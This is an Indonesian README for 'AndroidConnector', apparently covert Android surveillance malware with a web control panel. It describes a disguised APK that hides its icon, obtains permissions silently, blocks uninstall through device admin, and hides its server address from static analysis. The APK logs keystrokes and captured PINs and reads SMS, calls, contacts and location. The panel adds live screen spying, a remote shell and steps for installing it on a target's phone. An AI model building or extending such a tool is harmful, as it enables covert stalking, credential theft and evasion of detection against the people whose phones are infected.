# AndroidConnector

Sistem remote management Android berbasis web. Terdiri dari dua komponen utama: **Android APK** (agent yang berjalan di device target) dan **Web Dashboard** (panel kontrol berbasis Next.js yang dihosting di server).

---

## Arsitektur Sistem

```
┌─────────────────────────────────────────────────────────────────┐
│                        WEB DASHBOARD                            │
│          Next.js 14 · TypeScript · Tailwind · PostgreSQL        │
│                                                                 │
│  16 halaman   ─────────────────────────────────────────────     │
│  14 API route  ←──── HTTP REST + SSE streaming ────────────     │
└──────────────────────────────┬──────────────────────────────────┘
                               │  HTTPS polling / long-poll / SSE
                               │
┌──────────────────────────────▼──────────────────────────────────┐
│                       ANDROID APK                               │
│           Kotlin · Firebase Crashlytics · Android 8–14          │
│                                                                 │
│  ConnectorService (foreground)  ←── WatchdogReceiver            │
│  BootReceiver → auto-start on boot                              │
│  MediaProjection, Accessibility, DeviceAdmin, Keylogger         │
└─────────────────────────────────────────────────────────────────┘
```

---

## Statistik Kode

| Komponen | File | Baris |
|---|---|---|
| Kotlin (Android) | 17 | 3.299 |
| TypeScript / TSX (Web) | 42 | 6.942 |
| Android XML (manifest + res) | 19 | 397 |
| CSS | 1 | 113 |
| Gradle build scripts | 3 | 96 |
| **Total source code** | **82** | **12.847** |

---

## Android APK

### Spesifikasi

| Properti | Nilai |
|---|---|
| Application ID | `com.android.services` |
| Version | `2.0.0` (versionCode 2) |
| minSdk | 26 (Android 8.0 Oreo) |
| targetSdk | 34 (Android 14) |
| compileSdk | 34 |
| Bahasa | Kotlin |
| Build system | Gradle 8 |
| Firebase | Crashlytics + Analytics |
| R8 / ProGuard | ✅ aktif di release build |
| URL encryption | XOR cipher (SecureConfig, obfuscated by R8) |

### Struktur File Kotlin

| File | Baris | Fungsi |
|---|---|---|
| `ConnectorService.kt` | 978 | Core foreground service — polling server, eksekusi semua perintah, heartbeat, keepalive |
| `PinCaptureService.kt` | 349 | Capture PIN / pola layar via Accessibility |
| `DeviceInfo.kt` | 404 | Kumpulkan data device (info hardware, baterai, lokasi, app list, kontak, SMS, call log) |
| `FileOperations.kt` | 289 | Operasi file: list, download, upload, delete, copy |
| `SilentSetupActivity.kt` | 224 | Setup izin secara diam-diam (Accessibility, DeviceAdmin, Overlay, dll.) |
| `KeyloggerService.kt` | 241 | Rekam keystroke via InputMethod / Accessibility |
| `ControlAccessibilityService.kt` | 162 | Eksekusi perintah kontrol layar via Accessibility API |
| `MediaProjectionHolder.kt` | 156 | Kelola MediaProjection token untuk screen capture & live stream |
| `MainActivity.kt` | 195 | Entry point UI — request permission, launch SilentSetupActivity |
| `AppIcon.kt` | 41 | Sembunyikan / tampilkan icon launcher |
| `App.kt` | 31 | Application class — inisialisasi Firebase, global crash handler |
| `BootReceiver.kt` | 27 | BroadcastReceiver — auto-start service setelah device reboot |
| `WatchdogReceiver.kt` | 55 | AlarmManager watchdog — restart service jika mati |
| `NotificationMonitor.kt` | 76 | Intercept notifikasi masuk via NotificationListenerService |
| `SecureConfig.kt` | 31 | URL server di-XOR encrypt, tidak muncul sebagai plain string di APK |
| `SecretCodeReceiver.kt` | 30 | Trigger tersembunyi via secret dialer code |
| `AppDeviceAdminReceiver.kt` | 10 | Device admin receiver — cegah uninstall paksa |

### Izin & Fitur yang Digunakan

| Kategori | Izin / Fitur |
|---|---|
| Persistensi | `RECEIVE_BOOT_COMPLETED`, `FOREGROUND_SERVICE`, `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` |
| Konektivitas | `INTERNET`, `ACCESS_NETWORK_STATE`, `ACCESS_WIFI_STATE` |
| Lokasi | `ACCESS_FINE_LOCATION`, `ACCESS_COARSE_LOCATION`, `ACCESS_BACKGROUND_LOCATION` |
| Audio | `RECORD_AUDIO` |
| Media | `READ_MEDIA_IMAGES`, `READ_MEDIA_VIDEO`, `READ_MEDIA_AUDIO` |
| Storage | `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE` |
| Kontak & Log | `READ_CONTACTS`, `READ_CALL_LOG`, `READ_SMS` |
| Kamera | `CAMERA` |
| Layar | MediaProjection API (screen capture, live stream) |
| Kontrol | AccessibilityService (tap, swipe, type, home, back) |
| Admin | DeviceAdminReceiver (cegah uninstall) |
| Notifikasi | NotificationListenerService |

### Mekanisme Persistensi

1. **BootReceiver** — service restart otomatis setelah reboot
2. **WatchdogReceiver** — AlarmManager tembak setiap N menit, restart service jika mati
3. **START_STICKY** — OS restart service jika di-kill
4. **DeviceAdmin** — cegah user uninstall lewat UI normal
5. **AppIcon hidden** — icon launcher disembunyikan setelah setup

### Firebase Crashlytics

- Inisialisasi di `App.kt` (Application class)
- Global `UncaughtExceptionHandler` — tangkap semua crash yang tidak ter-handle
- Breadcrumb logging di setiap tahap kritis (`SilentSetupActivity`, `ConnectorService`, `MainActivity`)
- `recordException` di semua try-catch di `MainActivity`
- Firebase project: `androidcontrol-app` (project number: `647882259208`)

### Keamanan APK

- URL server di-XOR encrypt di `SecureConfig.kt` — tidak muncul sebagai string di APK
- R8 + obfuscation aktif di release build (`minifyEnabled true`, `shrinkResources true`)
- ProGuard rules custom di `proguard-rules.pro`
- Key split jadi 4 bagian (`p1()..p4()`) agar tidak mudah terbaca saat static analysis

### Bug yang Sudah Diperbaiki

| Bug | Root Cause | Fix |
|---|---|---|
| **Crash loop Android 14** | `startForeground(MEDIA_PROJECTION)` dipanggil pada service yang sudah berjalan → OS-level `SecurityException` uncatchable | Hapus `startForeground(MEDIA_PROJECTION)` dari `setupMediaProjectionInService`, manifest diubah ke `dataSync` only |
| **AVC denied spam `/proc/loadavg`** | Vivo/MIUI SELinux blokir `/proc/loadavg`, `getCpuUsage()` retry tiap 5 detik | Tambah flag `@Volatile procLoadavgBlocked` + `procStatBlocked` — skip setelah block pertama |
| **`onActivityResult` requestCode 2005 tidak ditangani** | Setelah kembali dari Accessibility Settings, tidak ada handler → activity hang | Tambah case `2005` di `SilentSetupActivity.onActivityResult` |
| **Package mismatch Crashlytics** | `applicationIdSuffix ".debug"` buat package debug berbeda dari `google-services.json` | Hapus `applicationIdSuffix` |

---

## Web Dashboard

### Tech Stack

| Teknologi | Versi | Kegunaan |
|---|---|---|
| Next.js | ^14.0.0 | Framework fullstack (App Router) |
| React | ^18 | UI library |
| TypeScript | ^5 | Bahasa |
| Tailwind CSS | ^3.3.0 | Styling |
| PostgreSQL | via `pg` ^8.21 | Database utama |
| Neon Serverless | ^1.1.0 | Serverless PostgreSQL driver |
| SWR | ^2.4.2 | Data fetching & revalidasi |
| Lucide React | ^0.378.0 | Icon set |
| UUID | ^9.0.1 | Generate command ID unik |
| SSE | native | Live stream dari device ke browser |

### Halaman Dashboard (16 halaman)

| Route | File | Baris | Fungsi |
|---|---|---|---|
| `/` | `app/page.tsx` | 582 | Dashboard utama — status device, statistik, overview |
| `/setup` | `app/setup/page.tsx` | 228 | Panduan setup APK di device target |
| `/control` | `app/control/page.tsx` | 473 | Kontrol layar jarak jauh via Accessibility |
| `/screenshot` | `app/screenshot/page.tsx` | 572 | Screenshot on-demand & riwayat |
| `/spy` | `app/spy/page.tsx` | 310 | Live screen stream real-time (SSE) |
| `/terminal` | `app/terminal/page.tsx` | 348 | Remote shell / terminal |
| `/files` | `app/files/page.tsx` | 458 | File manager — browse, download, upload, delete |
| `/gallery` | `app/gallery/page.tsx` | 433 | Galeri foto & video dari device |
| `/sms` | `app/sms/page.tsx` | 143 | Baca SMS masuk & keluar |
| `/calls` | `app/calls/page.tsx` | 150 | Riwayat panggilan |
| `/contacts` | `app/contacts/page.tsx` | 136 | Daftar kontak |
| `/keylog` | `app/keylog/page.tsx` | 162 | Log keystroke |
| `/pinlog` | `app/pinlog/page.tsx` | 289 | Log PIN / pola layar yang diketik |
| `/location` | `app/location/page.tsx` | 210 | Lokasi GPS real-time + riwayat |
| `/apps` | `app/apps/page.tsx` | 145 | Daftar aplikasi terinstal |
| `/build` | `app/build/page.tsx` | 244 | Trigger build APK & monitor GitHub Actions |

### API Routes (14 endpoint)

| Method | Endpoint | Fungsi |
|---|---|---|
| GET | `/api/devices` | List semua device terdaftar + status online |
| POST | `/api/device/heartbeat` | Device kirim heartbeat + data status |
| GET | `/api/device/poll` | Device polling perintah (long-poll) |
| POST | `/api/device/command` | Dashboard kirim perintah ke device |
| GET | `/api/device/command-wait` | Long-poll tunggu hasil perintah |
| POST | `/api/device/result` | Device submit hasil eksekusi perintah |
| POST | `/api/device/files` | Upload file dari device ke server |
| POST | `/api/device/keylog` | Device kirim data keylogger |
| POST | `/api/device/pinlog` | Device kirim data PIN capture |
| GET/POST | `/api/device/stream` | Live screen stream — SSE push ke browser |
| POST | `/api/device/stream-ack` | Acknowledge frame stream |
| POST | `/api/device/stream-mode` | Ubah mode stream (kualitas, fps) |
| GET | `/api/build` | Cek status build GitHub Actions |
| GET | `/api/debug` | Debug info server state |

### Library / Shared Code

| File | Baris | Fungsi |
|---|---|---|
| `lib/store.ts` | 335 | In-memory store — command queue, device state, stream buffer |
| `lib/db.ts` | 106 | PostgreSQL connection pool + query helpers |
| `lib/stream-registry.ts` | 123 | Registry SSE connections untuk live stream |
| `lib/sse.ts` | 22 | Helper SSE response builder |
| `components/Sidebar.tsx` | 370 | Navigasi sidebar + badge notifikasi |
| `components/StatCard.tsx` | 51 | Kartu statistik reusable |
| `contexts/DeviceContext.tsx` | 96 | React context — device yang sedang dipilih |
| `contexts/BadgeContext.tsx` | 87 | React context — badge count per fitur |

### Komunikasi APK ↔ Server

```
APK                                     Server
 │                                         │
 ├─── POST /heartbeat (tiap 30s) ─────────►│  Update status online
 │                                         │
 ├─── GET  /poll (long-poll) ─────────────►│  Tunggu perintah
 │◄─── {"command":"screenshot",...} ───────┤
 │                                         │
 ├─── POST /result (hasil) ───────────────►│  Simpan hasil
 │                                         │
 │    [Live Stream]                         │
 ├─── POST /stream (frame JPEG) ──────────►│  Buffer frame
 │                                         │◄── GET /stream (SSE) ── Browser
 └─── POST /stream-ack ───────────────────►│  Ack → kirim frame berikut
```

---

## CI/CD — GitHub Actions

Setiap push ke branch `main` otomatis trigger dua job parallel:

| Job | Artifact | Konfigurasi |
|---|---|---|
| **Build Debug APK** | `app-debug.apk` | `./gradlew assembleDebug` |
| **Build & Sign Release APK** | `app-release.apk` | `./gradlew assembleRelease` + R8 + keystore signing |

- APK tersedia sebagai GitHub Actions artifact setiap build sukses
- Halaman `/build` di dashboard menampilkan status build real-time via GitHub API

---

## Setup & Deployment

### Prerequisites

- Node.js 22.x
- PostgreSQL database (Neon serverless direkomendasikan)
- Android Studio (opsional, untuk build lokal)

### Web Dashboard

```bash
# Install dependencies
npm install

# Jalankan development server (port 5000)
npm run dev

# Build production
npm run build
npm start
```

### Environment Variables

| Variable | Keterangan |
|---|---|
| `DATABASE_URL` | PostgreSQL connection string |
| `SESSION_SECRET` | Secret untuk session management |
| `GITHUB_TOKEN` | GitHub token untuk trigger & monitor build |
| `VERCEL_TOKEN` | Vercel API token untuk deployment monitoring |

### Android APK

**Build via GitHub Actions (recommended):**
Push ke branch `main` → APK otomatis ter-build dan tersedia di Actions artifacts.

**Build lokal:**
```bash
cd android
./gradlew assembleDebug    # Debug APK
./gradlew assembleRelease  # Release APK (perlu keystore)
```

### Install APK ke Device Target

1. Enable "Install from unknown sources" di device
2. Install APK
3. Buka aplikasi, ikuti wizard setup
4. Grant semua permission yang diminta (Accessibility, Device Admin, Overlay)
5. Setelah setup selesai, icon akan tersembunyi otomatis
6. Device akan muncul di dashboard dalam beberapa detik

---

## Struktur Direktori

```
AndroidConnector/
├── android/                          # Android APK project
│   ├── app/
│   │   ├── build.gradle              # App-level dependencies + signing config
│   │   ├── google-services.json      # Firebase config
│   │   ├── proguard-rules.pro        # R8 / ProGuard rules
│   │   └── src/main/
│   │       ├── AndroidManifest.xml   # Manifest + permissions + services
│   │       ├── kotlin/com/android/services/
│   │       │   ├── App.kt                          # Application class + Firebase init
│   │       │   ├── ConnectorService.kt             # Core service (978 baris)
│   │       │   ├── DeviceInfo.kt                   # Data collector (404 baris)
│   │       │   ├── FileOperations.kt               # File manager (289 baris)
│   │       │   ├── KeyloggerService.kt             # Keylogger (241 baris)
│   │       │   ├── PinCaptureService.kt            # PIN capture (349 baris)
│   │       │   ├── ControlAccessibilityService.kt  # Accessibility control
│   │       │   ├── MediaProjectionHolder.kt        # Screen capture
│   │       │   ├── SilentSetupActivity.kt          # Permission setup
│   │       │   ├── MainActivity.kt                 # Entry point UI
│   │       │   ├── SecureConfig.kt                 # XOR-encrypted server URL
│   │       │   ├── AppIcon.kt                      # Icon hide/show
│   │       │   ├── BootReceiver.kt                 # Boot persistence
│   │       │   ├── WatchdogReceiver.kt             # Keepalive watchdog
│   │       │   ├── NotificationMonitor.kt          # Notification interceptor
│   │       │   ├── SecretCodeReceiver.kt           # Dialer secret trigger
│   │       │   └── AppDeviceAdminReceiver.kt       # Device admin
│   │       └── res/                  # Layouts, drawables, values, XML configs
│   └── build.gradle                  # Project-level build script
│
├── app/                              # Next.js App Router pages
│   ├── page.tsx                      # Dashboard utama (582 baris)
│   ├── layout.tsx                    # Root layout
│   ├── globals.css                   # Global styles
│   ├── api/                          # 14 API routes
│   │   ├── devices/route.ts
│   │   └── device/
│   │       ├── heartbeat/route.ts
│   │       ├── poll/route.ts
│   │       ├── command/route.ts
│   │       ├── command-wait/route.ts
│   │       ├── result/route.ts
│   │       ├── files/route.ts
│   │       ├── keylog/route.ts
│   │       ├── pinlog/route.ts
│   │       ├── stream/route.ts
│   │       ├── stream-ack/route.ts
│   │       └── stream-mode/route.ts
│   ├── control/page.tsx              # Remote control (473 baris)
│   ├── screenshot/page.tsx           # Screenshot viewer (572 baris)
│   ├── spy/page.tsx                  # Live stream (310 baris)
│   ├── terminal/page.tsx             # Remote shell (348 baris)
│   ├── files/page.tsx                # File manager (458 baris)
│   ├── gallery/page.tsx              # Media gallery (433 baris)
│   ├── keylog/page.tsx               # Keylogger (162 baris)
│   ├── pinlog/page.tsx               # PIN log (289 baris)
│   ├── location/page.tsx             # GPS location (210 baris)
│   ├── sms/page.tsx                  # SMS reader (143 baris)
│   ├── calls/page.tsx                # Call log (150 baris)
│   ├── contacts/page.tsx             # Contacts (136 baris)
│   ├── apps/page.tsx                 # App list (145 baris)
│   ├── build/page.tsx                # APK builder UI (244 baris)
│   └── setup/page.tsx                # Setup guide (228 baris)
│
├── components/
│   ├── Sidebar.tsx                   # Navigasi + badge (370 baris)
│   ├── StatCard.tsx                  # Stat card component
│   └── Providers.tsx                 # Context providers
│
├── contexts/
│   ├── DeviceContext.tsx             # Active device state
│   └── BadgeContext.tsx              # Notification badges
│
├── lib/
│   ├── store.ts                      # In-memory command & stream store (335 baris)
│   ├── db.ts                         # PostgreSQL client (106 baris)
│   ├── stream-registry.ts            # SSE connection registry (123 baris)
│   └── sse.ts                        # SSE helper
│
├── package.json                      # Node.js dependencies
├── tailwind.config.ts                # Tailwind configuration
├── tsconfig.json                     # TypeScript configuration
├── vercel.json                       # Vercel deployment config
└── README.md                         # Dokumentasi ini
```

---

## Versi & Changelog

### v2.0.0 (current)
- ✅ Firebase Crashlytics + Analytics terintegrasi
- ✅ Global crash handler di `App.kt`
- ✅ Fix crash loop Android 14 — hapus `startForeground(MEDIA_PROJECTION)` dari service yang sudah running
- ✅ Fix SELinux AVC spam — `procLoadavgBlocked` / `procStatBlocked` flag di `DeviceInfo`
- ✅ Fix `onActivityResult` requestCode 2005 tidak ditangani di `SilentSetupActivity`
- ✅ Fix package mismatch Crashlytics — hapus `applicationIdSuffix ".debug"`
- ✅ Crashlytics breadcrumb di setiap tahap kritis
- ✅ Server URL di-XOR encrypt via `SecureConfig`

### v1.0.0
- Initial release
- Core polling, heartbeat, remote commands
- Screen capture & live stream via MediaProjection
- Accessibility-based remote control
- File manager, keylogger, PIN capture

---

*Repository: [Kztutorial99/AndroidControl](https://github.com/Kztutorial99/AndroidControl) · Branch: `main`*
